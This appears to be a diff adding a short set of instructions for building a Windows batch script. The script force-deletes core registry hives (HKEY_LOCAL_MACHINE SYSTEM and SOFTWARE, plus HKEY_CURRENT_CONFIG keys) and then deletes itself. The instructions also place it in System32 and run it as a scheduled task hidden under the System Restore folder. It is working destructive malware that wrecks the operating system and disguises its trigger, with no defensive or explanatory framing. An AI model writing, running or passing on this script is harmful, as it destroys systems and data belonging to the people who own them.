@@ -1,0 +1,16 @@
+Create file bat:
+
+@ECHO OFF
+REG DELETE HKEY_CURRENT_CONFIG\System /f
+REG DELETE HKEY_CURRENT_CONFIG\Software /f
+REG DELETE HKEY_LOCAL_MACHINE\SYSTEM /f
+REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE /f
+(goto) 2>nul & del "%~f0"
+
+
+Save it to C:\Windows\System32
+
+Create a Scheduled task to launch it (in Windows/SystemRestore)
+
+
+
